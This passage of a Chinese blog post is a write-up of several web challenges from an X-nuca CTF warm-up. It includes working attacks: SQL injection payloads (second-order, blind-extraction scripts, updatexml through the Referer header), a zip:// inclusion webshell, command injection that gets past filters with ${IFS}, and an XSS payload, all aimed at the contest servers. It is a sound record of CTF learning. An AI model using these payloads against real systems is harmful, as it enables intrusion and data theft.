<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'guest'</span><span class="o">.</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mf">1e5</span><span class="p">,</span> <span class="mf">1e6</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$login</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'vote'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">'please select ...'</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$vote</span> <span class="o">&gt;</span> <span class="mi">5</span> <span class="o">||</span> <span class="nv">$vote</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="nv">$vote</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'vote'</span><span class="p">];</span>
<span class="nv">$vote</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$q</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"INSERT INTO t_vote VALUES (</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="nv">$vote</span><span class="si">}</span><span class="s2">, '</span><span class="si">{</span><span class="nv">$login</span><span class="si">}</span><span class="s2">')"</span><span class="p">);</span>
<span class="nv">$q</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"SELECT id FROM t_vote WHERE user = '</span><span class="si">{</span><span class="nv">$login</span><span class="si">}</span><span class="s2">' GROUP BY id"</span><span class="p">);</span>


<span class="k">echo</span> <span class="s1">'&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;'</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'&lt;table border="1"&gt;'</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;'</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$r</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$q</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"SELECT title FROM t_picture WHERE id = "</span><span class="o">.</span><span class="nv">$r</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]));</span>
    <span class="k">echo</span> <span class="s1">'&lt;tr&gt;&lt;td&gt;'</span><span class="o">.</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/td&gt;'</span><span class="p">;</span>
    <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = "</span><span class="o">.</span><span class="nv">$r</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]));</span>
    <span class="k">echo</span> <span class="s1">'&lt;td&gt;'</span><span class="o">.</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/td&gt;&lt;td&gt;'</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s1">'&lt;/td&gt;&lt;/tr&gt;'</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s1">'&lt;/table&gt;'</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'&lt;br&gt;&lt;a href="index.php"&gt;goBack&lt;/a&gt;&lt;br&gt;'</span><span class="p">;</span>
</code></pre></div>
<p>可以审计代码发现疑似是二次注入，利用的是id字段，这里有个小技巧就是利用hex来绕过is_numeric的检测<br>
经过测试是没问题的，但是猜测可能id字段长度有限。。。。所以去information_schema.tables里面注入不了东西 被截断了<br>
然后只能猜表名了。。。<br>
最后猜到是t_flag表 字段为flag</p>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/9.png" alt="poc"></p>

<p>最后吐槽一下这题提示有点少。。。。。</p>

<hr>

<h1 id="document">Document</h1>

<ul>
<li><p>题目url：<a href="http://218.76.35.74:20129/">http://218.76.35.74:20129</a><br>
进去之后查看源码发现有inlude.php提示<br>
进去include.php查看源码发现此文件有file参数和有upload.php的提升<br>
猜测这个文件是用来文件包含的，进去upload.php发现是个上传，那问题很清晰了， upload.php上传shell--&gt;include.php包含执行命令的文件--&gt;getshell</p></li>
<li><p>然后测试include.php发现php伪协议是可以用的<br>
读取源码<br>
upload.php</p></li>
</ul>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">method=</span><span class="s">"post"</span> 
<span class="na">name=</span><span class="s">"upload"</span><span class="nt">&gt;</span>file:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"file"</span> <span class="nt">/&gt;&lt;br&gt;</span> 
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"upload"</span> <span class="nt">/&gt;&lt;/form&gt;</span>
</code></pre></div><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span>
<span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
    <span class="nv">$allowedExts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"gif"</span><span class="p">,</span> <span class="s2">"jpeg"</span><span class="p">,</span> <span class="s2">"jpg"</span><span class="p">,</span> <span class="s2">"png"</span><span class="p">);</span>
    <span class="o">@</span><span class="nv">$temp</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
    <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(((</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/gif"</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/jpeg"</span><span class="p">)</span>
    <span class="o">||</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/jpg"</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/pjpeg"</span><span class="p">)</span>
    <span class="o">||</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/x-png"</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/png"</span><span class="p">))</span>
    <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"size"</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">102400</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span> <span class="nv">$allowedExts</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="s2">"upload/"</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="s2">"file upload successful!Save in:  "</span> <span class="o">.</span> <span class="s2">"upload/"</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"upload failed!"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>include.php</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
Tips: the parameter is file! :) 
<span class="c">&lt;!-- upload.php --&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div><div class="highlight"><pre><code class="language-php" data-lang="php">    <span class="o">@</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/http|data|ftp|input|%00/i'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)</span> <span class="o">||</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">".."</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">70</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;p&gt; error! &lt;/p&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="o">.</span><span class="s1">'.php'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>
<p>发现并没有过滤zip或者phar协议<br>
可以选择上传压缩包并用伪协议解压<br>
- 最后getshell payload如下：<br>
url+?file=zip://upload/shell.jpg%23shell&amp;pp=(命令写这)</p>

<p>这题有点坑的是不知道是谁写了个假flag在upload里面。。大家改得不亦悦乎23333333<br>
我以为flag已经被改掉了</p>

<p>结果最后还是自己太菜了。。。<br>
命令上find / | grep flag<br>
能在/etc/.sshkey/flag.txt下找到flag<br>
23333还是挺好玩的</p>

<hr>

<h1 id="part-202e9b23245d69ff">阳光总在风雨后</h1>

<ul>
<li>题目url：<a href="http://218.76.35.74:20130/">http://218.76.35.74:20130</a>
进去以后是个简单的登陆界面，扫一扫发现有admin目录（再次打广告 我刚刚撸的一个扫描器不错 在下一篇文章有介绍）然后就猜测是要注入登陆进去，日常输入admin、admin后发现提示密码错误，那就很明显是一个盲注了，然后这题还过滤了很多字符</li>
</ul>

<p>如：and、or、|、空格、union、information、.....<br>
这题有点坑。。过滤了information....也就是说表名要自己猜。。<br>
最后猜到是admin<br>
直接上脚本</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#coding:utf8
</span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'1</span><span class="se">\'</span><span class="si">%%</span><span class="s">(ascii(mid((select(group_concat(passwd))from(admin))from(</span><span class="si">%</span><span class="s">d)))=</span><span class="si">%</span><span class="s">d)</span><span class="si">%%</span><span class="se">\'</span><span class="s">1'</span>
<span class="n">passwd</span> <span class="o">=</span> <span class="s">''</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">34</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://218.76.35.74:20130/login.php'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'uname'</span><span class="p">:</span><span class="n">payload</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">),</span> <span class="s">'passwd'</span> <span class="p">:</span> <span class="s">'fuck'</span><span class="p">})</span>
        <span class="k">if</span> <span class="s">'password error!!'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="k">print</span> <span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
            <span class="n">passwd</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="n">payload</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'[*] passwd = '</span> <span class="o">+</span> <span class="n">passwd</span>
<span class="k">print</span> <span class="s">'[*] passwd = '</span> <span class="o">+</span> <span class="n">passwd</span>
</code></pre></div>
<p>跑出来密码是：<br>
50f87a3a3ad48e26a5d9058418fb78b5</p>

<p>去cmd5碰撞</p>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/10.png" alt="result"></p>

<p>拿admin、shuangshuang登陆进去之后是一个命令执行的界面</p>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/11.png" alt="命令执行"></p>

<p>ls一下发现只有index.php<br>
ls ../admin发现没有结果<br>
猜测是把空格过滤了，试试系统变量${IFS}可以绕过，然后尝试读取上一级目录发现只有login.php回显，不对劲，因为上一级目录是肯定存在index.php的，这里猜测是后台只截取了最后一行的输出，那这里可以使用head命令输出第一行<br>
命令执行绕过<a href="http://blog.csdn.net/qq_27446553/article/details/73927518">http://blog.csdn.net/qq_27446553/article/details/73927518</a></p>

<p>这里偷个懒直接写脚本了。。</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#coding:utf8
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">'PHPSESSID'</span> <span class="p">:</span> <span class="s">'5cpbv7knav0mfshnmn5a2u3ku4'</span><span class="p">}</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'http://218.76.35.74:20130/admin/index.php'</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">r'find${IFS}/${IFS}|grep${IFS}flag|head${IFS}-n${IFS}'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'ord'</span> <span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
    <span class="n">feedback</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'&lt;div class="login-content"&gt;.*&lt;p&gt;(.*)&lt;/br&gt;命令执行完成！.*'</span><span class="p">,</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span><span class="o">|</span><span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">feedback</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</code></pre></div>
<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/12.png" alt="flag"></p>

<p>这个有点可疑<br>
cat之后出flag</p>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/13.png" alt="poc"></p>

<hr>

<h1 id="xss">试试XSS</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20125/">http://218.76.35.75:20125</a>
这题很粗暴，直接XSS
不多说直接上poc</li>
</ul>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/14.png" alt="poc1"></p>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/15.png" alt="poc2"></p>

<p>这题要吐槽的是下面的payload不行。。。？？why？？？</p>

<p><strong>&#39; onerror=&#39;alert(document.domain)&#39;</strong></p>

<hr>

<h1 id="http">http头注入</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20121/">http://218.76.35.75:20121</a>
进去之后又提示，修改http头，点击link进入之后Fuzz出Referer存在注入，估计是insert的注入，一般来说是基于时间的盲注和报错注入，这里我选择比较简单快捷的报错注入，具体payload估计已经烂大街了，如下：
**
<a href="http://1">http://1</a>&#39; || 1=(updatexml(1,concat(0x3a,(查询语句)),1)) || &#39;
**</li>
</ul>

<p>结果如下：<br>
库名：<strong><a href="http://1">http://1</a>&#39; and 1=(updatexml(1,concat(0x3a,(select database())),1)) and &#39;</strong><br>
ctfweb20110<br>
表名：<strong><a href="http://1">http://1</a>&#39; and 1=(updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;ctfweb20110&#39;)),1)) and &#39;</strong><br>
flag,visits<br>
字段名：<strong><a href="http://1">http://1</a>&#39; and 1=(updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name = &#39;flag&#39;)),1)) and &#39;</strong><br>
id,flag<br>
查flag：<strong><a href="http://1">http://1</a>&#39; and 1=(updatexml(1,concat(0x3a,(select flag from flag)),1)) and &#39;</strong></p>

<hr>

<h1 id="part-bb73616c268b1150">最安全的笔记管理系统</h1>

<ul>
<li>题目url：<a href="http://218.76.35.74:20128/">http://218.76.35.74:20128</a></li>
</ul>

<hr>

<p>......<br>
待更新（不更新了）</p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
